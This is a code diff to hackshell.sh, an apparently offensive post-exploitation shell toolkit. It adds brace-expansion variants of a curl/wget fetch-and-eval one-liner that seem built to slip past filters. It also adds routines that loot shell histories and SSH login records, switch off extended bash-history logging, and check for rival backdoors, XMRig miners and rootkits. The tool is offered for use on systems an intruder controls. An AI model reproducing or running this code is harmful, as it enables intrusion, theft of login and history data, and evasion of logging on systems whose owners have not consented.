@@ -15,6 +15,8 @@
 #     source <(wget -qO-  https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)
 #     eval  "$(curl -SsfL https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"
 #     eval  "$(wget -qO-  https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh)"
+#     {eval,"$({curl,-SsfL,https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh})"}
+#     {eval,"$({wget,-qO-,https://github.com/hackerschoice/hackshell/raw/main/hackshell.sh})"}
 #
 # Environment variables (optional):
 #    XHOME=         Set custom XHOME directory [default: /dev/shm/.$'\t''~?$:?']
@@ -1000,7 +1002,8 @@ _loot_homes() {
     for hn in "${HOMEDIRARR[@]}"; do
         fn="${hn}/${fname}"
         [ ! -s "$fn" ] && continue
-        str="$("$@" "$fn" 2>/dev/null)"
+        # Remove "empty" lines. Non-GNU: 
+        str="$("$@" "$fn" 2>/dev/null | sed '/^[[:space:]]*$/d')"
         [ -z "$str" ] && continue
         echo -e "${CB}${name} ${CDY}${fn}${CF}"
         echo "$str"
@@ -1288,6 +1291,56 @@ _warn_edr() {
     unset -f _hs_chk_systemd _hs_chk_fn
 }
 
+# Warn of script kiddies
+_warn_skids() {
+    local str s
+
+    _warn_fn_found() { [ -f "$1" ] && str+="$1: $2"$'\n'; }
+
+    _warn_fn_found "/etc/default/processd.conf" "XMR mining config"
+    # /tmp/.tmp/bitrix/bitrix running xmrig miner
+    _warn_fn_found "/usr/sbin/supervise"        "gsnc backdoor found"
+    _warn_fn_found "/usr/bin/defunct"           "gsnc backdoor found"
+    _warn_fn_found "/usr/bin/gs-dbus"           "gsnc backdoor found"
+
+    # _warn_fn_found "/usr/libexec/ebtables"      "Bridge skids backdoor found"
+    [ -n "$str" ] && {
+        echo -e "${CR}Script Kiddie files found${CF}"
+        echo -n "$str"$'\033[0m'
+    }
+
+    # grep -qFm1 '~/.tmp_u' ~/.bashrc 2>/dev/null && str+="Suspicious SSH authorized_key found: ~/.tmp.u"$'\n'
+    grep -qFm1 'authorized_keys' ~/.bashrc 2>/dev/null && echo -e "${CR}Suspicious SSH authorized_key shenanigans found: ~/.bashrc${CN}"
+
+    s="$(grep -HoaFm1 XMRIG_VERSION /proc/*/exe 2>/dev/null | sed 's|[^0-9]||g')"
+    [ -n "$s" ] && {
+        echo -e "${CR}XMRig miner processes found:${CF}"
+        # ps --no-headers -eo pid,%cpu,%mem,command => NOT PORTABLE
+        for x in $s; do
+            echo "PID: $x"$'\t'" $(stat -c '%U' /proc/$x)"$'\t'" $(strings /proc/$x/cmdline 2>/dev/null)"
+        done
+        echo -en "${CN}"
+    }
+
+    s="$(grep -F 'base64 -d' ~/.bashrc 2>/dev/null)"
+    [ -n "$s" ] && {
+        echo -e "${CR}Suspicious base64 -d found in ~/.bashrc${CF}"
+        echo "$s"$'\033[0m'
+    }
+
+    s="$(grep -r bash /etc/systemd/system/multi-user.target.wants/* 2>/dev/null)"
+    [ -n "$s" ] && {
+        echo -e "${CR}Suspicious systemd services:${CF}"
+        echo "$s"$'\033[0m'
+    }
+
+    s="$(crontab -l 2>/dev/null |strings| grep -iE '(xmrig|mining|base64)' )"
+    [ -n "$s" ] && {
+        echo -e "${CR}Suspicious cronjobs:${CF}"
+        echo "$s"$'\033[0m'
+    }
+}
+
 xpty() {
     local our_pty="$(tty)"
     our_pty="${our_pty##*/}"
@@ -1301,8 +1354,7 @@ xpty() {
     # reminder: do not use gawk functions, e.g. systime
 }
 
-# Warn if there are other root kits found.
-_warn_rk() {
+_warn_lkm() {
     local n=0
     local tainted
     local str
@@ -1328,6 +1380,39 @@ _warn_rk() {
     [ -f /sys/kernel/tracing/enabled_functions ] && echo -e "Try ${CDC}cat /sys/kernel/tracing/enabled_functions${CN}"
     [ -f /sys/kernel/tracing/touched_functions ] && echo -e "Try ${CDC}cat /sys/kernel/tracing/touched_functions${CN}"
 }
+
+# Check for any processes without binaries (deleted/memfd)
+_warn_rk_exe() {
+    local str x out az t w
+
+    str="$(readlink -f /proc/*/exe 2>/dev/null | grep -E '(\(deleted\)$|^/memfd:)')"
+    [ -z "$str" ] && return
+
+    for x in /proc/[123456789]*/exe; do
+        str="$(readlink -f "$x" | grep -E '(\(deleted\)$|^/memfd:)')"
+        [ -z "$str" ] && continue
+        x="${x:6}"
+        x="${x%%/*}"
+        [ -z "$x" ] && continue
+        read -d '' az <"/proc/${x}/cmdline"
+        [ -z "$az" ] && continue
+        unset w
+        [ "${#az}" -gt 80 ] && [[ "${az}" == *" "* ]] && w=" [pid faking options with \s]"
+        az+="                                                                        "
+        out+="$x"$'\t'"${az:0:64}"$'\n'"        +EXE:${str}${w}"$'\n'
+    done
+    [ -z "$out" ] && return
+    echo -e "${CDY}Processes without binaries:${CF}"
+    echo -n "$out"
+    echo -en "${CN}"
+}
+
+# Warn if there are other root kits found.
+_warn_rk() {
+    command -v readlink >/dev/null && _warn_rk_exe
+    _warn_lkm
+}
+
 
 _hs_gen_home() {
     local IFS
@@ -1411,6 +1496,11 @@ lootlight() {
     [ ! -d /sf ] && {
         _warn_edr
         _warn_rk
+        _warn_skids
+    }
+    declare -f _extended_history >/dev/null && [ -n "$PROMPT_COMMAND" ] && {
+        unset PROMPT_COMMAND
+        echo -e "${CR}Extended bash-history was enabled. Check ~/.bash_extended_history${CN}"
     }
 }
 
@@ -1482,6 +1572,15 @@ _lootmore_vz() {
     echo -en "${CN}"
 }
 
+_loot_auth_log() {
+    [ ! -f "${ROOTFS}/var/log/auth.log" ] && return
+    str="$({ grep -ohE 'sshd.* Accepted .*' "${ROOTFS}/var/log/auth.log.1" "${ROOTFS}/var/log/auth.log"  | awk '{ print $7"\t"$5"\t"$3;}' | anew | tail -n 30;} 2>/dev/null)"
+    [ -z "$str" ] && return
+    echo -e "${CB}SSHD Logins:${CDY}${CF}"
+    echo "$str"
+    echo -en "${CN}"
+}
+
 lootmore() {
     local hn fn str arr
 
@@ -1492,15 +1591,33 @@ lootmore() {
     for hn in "${HOMEDIRARR[@]}"; do
         fn=()
         [ -f "${hn}/.bash_history" ] && fn+=("${hn}/.bash_history")
+        # gs-netcat
+        # GS_HOST=xxx gs-netcat
+        [ -f "${hn}/.bash_extended_history" ] && fn+=("${hn}/.bash_extended_history")
+        # [2025-11-13 10:58:53] () root /root: gs-netcat
+        # [2025-11-13 10:58:53] () root /root:  gs-netcat
+        # [2025-11-13 10:58:53] () root /root: GS_HOST= gs-netcat
         [ -f "${hn}/.zsh_history" ] && fn+=("${hn}/.zsh_history")
+        # : 1762985354:0;gs-netcat
+        # : 1762985354:0;GS_HOST= gs-netcat
+
         [ ${#fn[@]} -eq 0 ] && continue
-        str="$(grep -h -e ^ssh -e ^scp -e ^sftp -e ^rsync -e ^git -e ^rclone "${fn[@]}" 2>/dev/null | sort -u)"
+        str="$(grep -hE '([ ;]{1}|^)(ssh|scp|sftp|sshfs|rsync|git|rclone|gs-netcat) ' "${fn[@]}" 2>/dev/null | nocol | anew)"
 
         [ -z "$str" ] && continue
         echo -e "${CB}Interesting commands ${CDY}${hn}/.[bash|zsh]_history${CF}"
         echo "$str"
         echo -en "${CN}"
     done
+
+    unset str
+    command -v lastlog >/dev/null && str="$(lastlog -R "${ROOTFS}/" 2>/dev/null | grep -vF 'Never logged')"
+    command -v lastlog2 >/dev/null && [ -z "$str" ] && str="$(lastlog2 -a -d "${ROOTFS}/var/lib/lastlog/lastlog2.db" 2>/dev/null)"
+    [ -n "$str" ] && {
+        echo -e "${CB}Logins ${ROOTFS:+[${ROOTFS}]}${CDY}${CF}"
+        echo "$str"
+        echo -en "${CN}"
+    }
 
     [ -z "${ROOTFS}" ] && {
         str="$(dmesg -T 2>/dev/null | tail -n 10)"
@@ -1509,13 +1626,9 @@ lootmore() {
             echo "$str"
             echo -en "${CN}"
         }
-        command -v lastlog >/dev/null && {
-            echo -e "${CB}Logins ${CDY}${CF}"
-            lastlog 2>/dev/null | grep -vF 'Never logged'
-            echo -en "${CN}"
-        }
+
         # Execute in subshell so that 'source' does not mess with our variables.
-        (source "${ROOTFS}/etc/apache2/envvars" 2>/dev/null && {
+        (source "/etc/apache2/envvars" 2>/dev/null && {
             unset str
             set -f
             IFS=$'\n' arr=($(ps auxw|awk '{print $11}'|grep -e "[a]pache" -e "[h]ttpd"|grep -v lighttpd|sort -u))
@@ -1532,6 +1645,7 @@ lootmore() {
         })
     }
     _lootmore_last
+    _loot_auth_log
     _lootmore_docker
     _lootmore_pct
     _lootmore_lxc
@@ -2025,6 +2139,15 @@ scan() {
     done
 }
 
+xnetstat() {
+    command -v ss >/dev/null && {
+        ss "$@"
+        return
+    }
+    echo >&2 "FIXME: Add awk_netstat.sh here. In the meantime try 'bin netstat'"
+    return 255
+}
+
 hs_init_alias_reinit() {
     which curl &>/dev/null && curl --help 2>/dev/null | grep -iqm1 proto-default && alias curl="HOME=/dev/null curl --proto-default https"
     # stop curl from creating ~/.pkt/nssdb
@@ -2033,6 +2156,9 @@ hs_init_alias_reinit() {
 
     unalias anew &>/dev/null
     which anew &>/dev/null || alias anew=xanew
+
+    unalias netstat &>/dev/null
+    which netstat &>/dev/null || alias netstat=xnetstat
 }
 
 hs_init_alias() {
